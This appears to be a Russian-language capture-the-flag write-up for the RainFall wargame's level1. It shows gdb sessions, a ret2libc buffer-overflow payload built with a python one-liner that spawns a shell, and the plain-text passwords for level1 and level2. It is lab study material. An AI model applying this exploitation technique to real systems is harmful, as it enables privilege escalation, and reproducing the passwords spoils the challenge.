1. Логинимся level1:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
2. Исследуем программу. TODO:: Расписать 

(gdb) r
Starting program: /home/user/level1/level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb)


offset -> 76


system -> 0x08048360
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0x08048360  system


/bin/sh -> 0xb7f8cc58

(gdb) info proc map
process 3336
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level1/level1
         0x8049000  0x804a000     0x1000        0x0 /home/user/level1/level1
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find &system,+99,"/bin/sh"
Pattern not found.
(gdb) find &system,+99999,"/bin/sh"
Pattern not found.
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) find 0xb7e2c000,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.


Готовим payload

system -> 0x08048360
/bin/sh -> 0xb7f8cc58

offset + system call + padding + string call
python -c "print 'x'*76 + '\x60\x83\x04\x08'+ '0000'+'\x58\xcc\xf8\xb7'"

Result

level1@RainFall:~$ python -c "print 'x'*76 + '\x60\x83\x04\x08'+ '0000'+'\x58\xcc\xf8\xb7'" > /tmp/l1
level1@RainFall:~$ cat /tmp/l1 /dev/stdin | ./level1
whoami
level2


level1@RainFall:~$ cat /tmp/l1 /dev/stdin | ./level1
whoami
level2
cd ../level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
